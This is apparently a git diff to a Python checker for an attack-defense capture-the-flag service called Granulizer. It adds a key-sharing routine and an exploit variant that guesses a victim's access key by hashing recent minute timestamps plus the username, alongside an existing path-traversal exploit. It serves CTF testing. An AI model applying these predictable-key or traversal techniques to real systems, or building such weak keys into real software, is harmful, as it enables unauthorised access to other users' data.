@@ -8,6 +8,7 @@ import json
 import re
 import itertools
 import hashlib
+import time
 
 #### Checker Tenets
 # A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
@@ -143,8 +144,37 @@ class GranulizerChecker(BaseChecker):
             read_until=b"Success\n",
             exception_message="B64 encoded flag writing did not work"
         )
-
     
+    #downloads a shared pcm from another user
+    def get_shared_pcm(self, conn: SimpleSocket, user: str, filename: str, key: str) -> bytearray:
+        self.debug(f"Get shared .pcm file")
+        conn.write(f"sharing use key\n")
+        conn.readline_expect(
+            b"Access user: ",
+            read_until=b"Access user: ",
+            exception_message="Unexpected message from server for using shared key"
+        )
+        conn.write(f"{user}\n")
+        conn.readline_expect(
+            b"Access key: ",
+            read_until=b"Access key: ",
+            exception_message="Unexpected message from server for using shared key"
+        )
+        conn.write(f"{key}\n")
+        conn.readline_expect(
+            b"Which file would you like to access: ",
+            read_until=b"Which file would you like to access: ",
+            exception_message="Unexpected message from server for using shared key"
+        )
+        conn.write(f"{filename}\n")
+        line = conn.read_n_lines(1)
+        line = line[0]
+        line = line.decode('utf-8')
+        self.debug(line)
+        if "written to file" not in line:
+            raise EnoException("Failed to access shared .pcm file")
+        conn.read_until("> ")
+
     def get_pcm(self, conn: SimpleSocket, filename: str) -> bytearray:
         self.debug(f"Get .pcm file as flag")
 
@@ -264,7 +294,6 @@ class GranulizerChecker(BaseChecker):
             read_until=b"> ",
             exception_message="Wrong output for granulize info"
         )
-        
         back = {}
 
         #convert:
@@ -279,6 +308,16 @@ class GranulizerChecker(BaseChecker):
         
         return back
 
+    def active_key_sharing(self, conn: SimpleSocket):
+        conn.write(f"sharing allow\n")
+        line = conn.read_n_lines(1)
+        line = line[0].decode('utf-8')
+        self.debug(line)
+        key = line.split(" ")[2]
+        key = key.replace('\n', '')
+        if (len(key) != 64):
+            raise EnoException("Unexpected key length of not 64 read from server")
+        
 
     def putflag(self):  # type: () -> None
         """
@@ -314,6 +353,9 @@ class GranulizerChecker(BaseChecker):
 
             # Now we need to login
             self.login_user(conn, username, password)
+
+            #activate key sharing for this user
+            self.active_key_sharing(conn)
 
             # Put flag (.pcm file)
             self.debug("Put flag:")
@@ -387,7 +429,11 @@ class GranulizerChecker(BaseChecker):
     def havoc(self):
         raise EnoException("Wrong variant_id provided")
     
-
+    def get_time_minutes(self) -> int:
+        t = int(time.time())
+        t = t // 100 #only minutes
+        return t
+    
     def exploit(self):
         """
         This method was added for CI purposes for exploits to be tested.
@@ -409,12 +455,6 @@ class GranulizerChecker(BaseChecker):
 
             #check
             #hash flag!
-            '''
-            flag_hash = hashlib.sha256(flag.encoide()).hexdigest()
-
-            if flag_hash != self.flag_hash:
-                raise BrokenServiceException("Flag is not correct")
-            '''
             attack_info = json.loads(self.attack_info)
             self.debug("Got attack info:")
             self.debug(attack_info)
@@ -442,7 +482,7 @@ class GranulizerChecker(BaseChecker):
 
             # Now we need to login
             self.login_user(conn, username, password)
-            
+
             # Granulize file of user to be exploited
             path_traversal = "../{user_name}/{file_name}".format(user_name=user_name_exploit, file_name = file_name_exploit)
             self.granulize_file(conn, path_traversal, username)
@@ -480,7 +520,86 @@ class GranulizerChecker(BaseChecker):
             
             return reversed
         elif self.variant_id == 1:
-            pass
+            attack_info = json.loads(self.attack_info)
+            self.debug("Got attack info:")
+            self.debug(attack_info)
+            user_name_exploit = attack_info['user_name']
+            file_name_exploit = attack_info['file_name']
+            
+            for i in range(15): #test keys for the last 15 minutes
+                try:
+                    # Log a message before any critical action that could raise an error.
+                    self.debug(f"Connecting to service for exploit 2")
+                    # Create a TCP connection to the service.
+                    conn = self.connect()
+                    welcome = conn.read_until(">")
+
+                    username: str = "".join(
+                        random.choices(string.ascii_uppercase + string.digits, k=12)
+                    )
+                    password: str = "".join(
+                        random.choices(string.ascii_uppercase + string.digits, k=12)
+                    )
+                    details: str = "".join(
+                        random.choices(string.ascii_uppercase + string.digits, k=12)                
+                    )
+
+                    # Register a new random user for exploiting
+                    self.register_user(conn, username, password, details)
+
+                    # Now we need to login
+                    self.login_user(conn, username, password)
+                    #Generate key for user to be exploited
+                    t = self.get_time_minutes()
+                    t -= i #try minutes before that too
+                    t_str = str(t)
+                    key = t_str + user_name_exploit
+                    self.debug("Key to be exploited: ")
+                    self.debug(key)
+                    
+                    #hash the key
+                    key_hash = hashlib.sha256(key.encode('utf-8')).hexdigest()
+                    self.debug("Hashed key")
+                    self.debug(key_hash)
+
+                    #try this key
+                    self.get_shared_pcm(conn, user_name_exploit, file_name_exploit, key_hash)
+
+                    #Get granulize parameters
+                    granulize_params = self.granulize_info(conn)
+                    self.debug("Granulize_params:")
+                    self.debug(granulize_params)
+
+                    #get file for reversing
+                    data = self.get_pcm(conn, "granulized.pcm")
+                    self.debug("Got data from server:")
+                    self.debug(data)
+                    data_number_samples = granulize_params['granular_number_samples'] 
+                    data_order_samples = granulize_params['granular_order_samples']
+                    data_order_timelens = granulize_params['granular_order_timelens']
+                    data_buffer_lens = granulize_params['granular_order_buffer_lens']
+                    #reverse
+                    reversed = self.reverse_pcm(
+                        data, 
+                        data_number_samples,
+                        data_order_samples,
+                        data_order_timelens,
+                        data_buffer_lens)
+                    self.debug("Complete reversed: ")
+                    self.debug(reversed)
+                    #build hash of this flag and compare
+                    flag_hash_got = hashlib.sha256(reversed.encode()).hexdigest()
+                    self.debug(flag_hash_got)
+                    self.debug(self.flag_hash)
+
+                    if flag_hash_got != self.flag_hash:
+                        raise BrokenServiceException("Flag is not correct")
+                    self.debug("Correct hash!")
+                    
+                    return reversed
+                except:
+                    self.warning("Exploit for time -{} did not work".format(i))
+
         else:
             raise EnoException("Wrong variant_id provided: {}".format(self.variant_id))
 
